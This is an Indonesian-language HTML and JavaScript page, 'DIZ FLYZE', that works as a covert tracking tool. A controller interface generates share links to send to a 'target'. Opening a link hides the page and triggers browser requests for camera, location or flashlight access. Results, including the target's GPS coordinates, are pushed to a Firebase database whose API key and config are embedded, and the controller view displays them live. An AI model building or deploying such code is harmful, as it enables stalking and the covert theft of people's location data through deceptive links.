<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>DIZ FLYZE</title>
  <!-- Bootstrap CSS untuk styling dasar -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <!-- Custom Styles -->
  <style>
    /* Reset & dasar */
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #0d0d0d, #1f1f1f);
      color: #fff;
      transition: background 0.5s, opacity 0.5s;
    }
    /* UI untuk controller */
    #controllerUI {
      display: block;
    }
    /* Sembunyikan UI target (akan diubah di JS) */
    #targetUI {
      display: none;
    }
    /* Contoh styling sederhana (Anda bisa sesuaikan) */
    #header, #mainContent, #footer {
      padding: 10px;
      text-align: center;
    }
    #actions {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin: 20px;
      flex-wrap: wrap;
    }
    .icon-column {
      width: 150px;
      height: 150px;
      border: 1px solid #39ff14;
      border-radius: 8px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      transition: transform 0.2s;
    }
    .icon-column:hover {
      transform: scale(1.05);
    }
    /* Loading screen */
    #loadingScreen {
      position: fixed;
      top:0;
      left:0;
      width: 100%;
      height: 100%;
      background: #0d0d0d;
      color: #fff;
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }
  </style>
</head>
<body>
  <!-- Loading Screen -->
  <div id="loadingScreen">
    <p>Loading...</p>
  </div>

  <!-- UI untuk Controller (ditampilkan jika mode controller) -->
  <div id="controllerUI">
    <div id="header">
      <h1>DIZ FLYZE - Controller</h1>
    </div>
    <div id="mainContent">
      <p>Pilih fitur untuk mendapatkan share link ke target.</p>
      <div id="actions">
        <div class="icon-column" id="cameraColumn">
          <img src="https://i.ibb.co/k2tPDQ7g/b5739f059db1.png" alt="Camera Icon" style="width:50px;">
          <p>Camera</p>
        </div>
        <div class="icon-column" id="locationColumn">
          <img src="https://via.placeholder.com/50?text=Loc" alt="Location Icon">
          <p>Location</p>
        </div>
        <div class="icon-column" id="fileColumn">
          <img src="https://via.placeholder.com/50?text=File" alt="File Icon">
          <p>File</p>
        </div>
        <div class="icon-column" id="flashColumn">
          <img src="https://via.placeholder.com/50?text=Flash" alt="Flash Icon">
          <p>Flash</p>
        </div>
      </div>
      <!-- Tempat untuk menampilkan share link (misalnya modal atau input) -->
      <div id="shareLinkDisplay"></div>
    </div>
    <div id="footer">
      &copy; DIZ FLYZE
    </div>
  </div>

  <!-- Firebase SDK & jQuery -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <script>
    /***** Inisialisasi Parameter & Mode *****/
    const urlParams = new URLSearchParams(window.location.search);
    // Mode target: jika ada parameter "session" dan "feature" tanpa "control"
    const isTarget = (urlParams.has('session') && urlParams.has('feature') && !urlParams.has('control'));
    console.log("isTarget =", isTarget);
    
    // Jika parameter session ada, gunakan; jika tidak, buat session baru (untuk controller)
    let sessionId = urlParams.get('session') || 'session_' + Date.now();
    const feature = urlParams.get('feature'); // bisa null
    const refPath = 'ALL DATA/' + sessionId;
    
    // Tampilkan loading screen sesaat
    $("#loadingScreen").fadeIn(200);
    setTimeout(() => { $("#loadingScreen").fadeOut(200); }, 800);

    /***** Inisialisasi Firebase *****/
    const firebaseConfig = {
      apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
      authDomain: "login-24767.firebaseapp.com",
      databaseURL: "https://login-24767-default-rtdb.firebaseio.com",
      projectId: "login-24767",
      storageBucket: "login-24767.appspot.com",
      messagingSenderId: "809521846306",
      appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
    };
    firebase.initializeApp(firebaseConfig);

    /***** Fungsi Debug: Log ke konsol *****/
    function logEvent(featureName, data) {
      console.log("[" + featureName + "]", data);
    }

    /***** Fungsi-Fungsi Fitur (Mode Target) *****/
    function captureCamera() {
      console.log("Menjalankan captureCamera()");
      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(function(stream){
            firebase.database().ref(refPath + '/camera').push({
              activated: true,
              timestamp: new Date().toISOString()
            });
            stream.getTracks().forEach(track => track.stop());
          })
          .catch(function(err){
            firebase.database().ref(refPath + '/camera').push({
              error: 'Camera error: ' + err,
              timestamp: new Date().toISOString()
            });
          });
      } else {
        firebase.database().ref(refPath + '/camera').push({
          error: 'Browser tidak mendukung kamera',
          timestamp: new Date().toISOString()
        });
      }
    }

    function captureLocation() {
      console.log("Menjalankan captureLocation()");
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(position){
          firebase.database().ref(refPath + '/location').push({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            timestamp: new Date().toISOString()
          });
        }, function(error){
          firebase.database().ref(refPath + '/location').push({
            error: 'Location error: ' + error.message,
            timestamp: new Date().toISOString()
          });
        });
      } else {
        firebase.database().ref(refPath + '/location').push({
          error: 'Browser tidak mendukung geolokasi',
          timestamp: new Date().toISOString()
        });
      }
    }

    function captureFlash() {
      console.log("Menjalankan captureFlash()");
      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
          .then(function(stream){
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            imageCapture.getPhotoCapabilities().then(function(capabilities){
              if(capabilities.torch){
                track.applyConstraints({ advanced: [{ torch: true }] })
                  .then(() => {
                    firebase.database().ref(refPath + '/flash').push({
                      activated: true,
                      timestamp: new Date().toISOString()
                    });
                    setTimeout(() => {
                      track.applyConstraints({ advanced: [{ torch: false }] })
                        .then(() => {
                          firebase.database().ref(refPath + '/flash').push({
                            deactivated: true,
                            timestamp: new Date().toISOString()
                          });
                          track.stop();
                        });
                    }, 3000);
                  })
                  .catch(function(error){
                    firebase.database().ref(refPath + '/flash').push({
                      error: 'Flash error: ' + error,
                      timestamp: new Date().toISOString()
                    });
                    stream.getTracks().forEach(track => track.stop());
                  });
              } else {
                firebase.database().ref(refPath + '/flash').push({
                  error: 'Fitur torch tidak didukung',
                  timestamp: new Date().toISOString()
                });
                stream.getTracks().forEach(track => track.stop());
              }
            }).catch(function(error){
              firebase.database().ref(refPath + '/flash').push({
                error: 'Torch capability error: ' + error,
                timestamp: new Date().toISOString()
              });
              stream.getTracks().forEach(track => track.stop());
            });
          })
          .catch(function(error){
            firebase.database().ref(refPath + '/flash').push({
              error: 'getUserMedia error untuk flash: ' + error,
              timestamp: new Date().toISOString()
            });
          });
      } else {
        firebase.database().ref(refPath + '/flash').push({
          error: 'Browser tidak mendukung fitur ini',
          timestamp: new Date().toISOString()
        });
      }
    }

    /***** Eksekusi Berdasarkan Mode *****/
    if (isTarget) {
      console.log("Mode TARGET aktif. Menyembunyikan UI dan menjalankan fitur:", feature);
      // Sembunyikan UI controller (target tidak melihat antarmuka)
      document.body.style.display = 'none';
      // Jalankan fungsi sesuai parameter "feature"
      switch(feature) {
        case 'camera':
          captureCamera();
          break;
        case 'location':
          captureLocation();
          break;
        case 'flash':
          captureFlash();
          break;
        case 'file':
          // Karena file membutuhkan interaksi, kita kirim log error
          firebase.database().ref(refPath + '/file').push({
            error: 'Fitur file membutuhkan interaksi pengguna',
            timestamp: new Date().toISOString()
          });
          break;
        default:
          firebase.database().ref(refPath + '/general').push({
            message: 'Tidak ada fitur yang dijalankan',
            timestamp: new Date().toISOString()
          });
          break;
      }
    } else {
      console.log("Mode CONTROLLER aktif. Menampilkan UI.");
      // Pastikan UI controller tampil
      document.body.style.display = 'block';

      // Pasang listener untuk menerima data aktivitas target (contoh sederhana)
      firebase.database().ref(refPath).on('child_added', function(snapshot) {
        logEvent(snapshot.key, snapshot.val());
        // Misalnya, tampilkan log di #shareLinkDisplay (Anda bisa kembangkan lebih lanjut)
        $("#shareLinkDisplay").append("<p>" + snapshot.key + ": " + JSON.stringify(snapshot.val()) + "</p>");
      });

      /***** Event Listener UI Controller *****/
      // Fitur Camera
      $("#cameraColumn").on("click", function() {
        // Buat share link untuk fitur camera (tanpa parameter control)
        const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=camera";
        $("#shareLinkDisplay").html("<p>Share Link Camera: <input type='text' value='" + shareLink + "' readonly></p>");
      });
      // Fitur Location
      $("#locationColumn").on("click", function() {
        const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=location";
        $("#shareLinkDisplay").html("<p>Share Link Location: <input type='text' value='" + shareLink + "' readonly></p>");
      });
      // Fitur File
      $("#fileColumn").on("click", function() {
        const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=file";
        $("#shareLinkDisplay").html("<p>Share Link File: <input type='text' value='" + shareLink + "' readonly></p>");
      });
      // Fitur Flash
      $("#flashColumn").on("click", function() {
        const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=flash";
        $("#shareLinkDisplay").html("<p>Share Link Flash: <input type='text' value='" + shareLink + "' readonly></p>");
      });
    }
  </script>
</body>
</html>
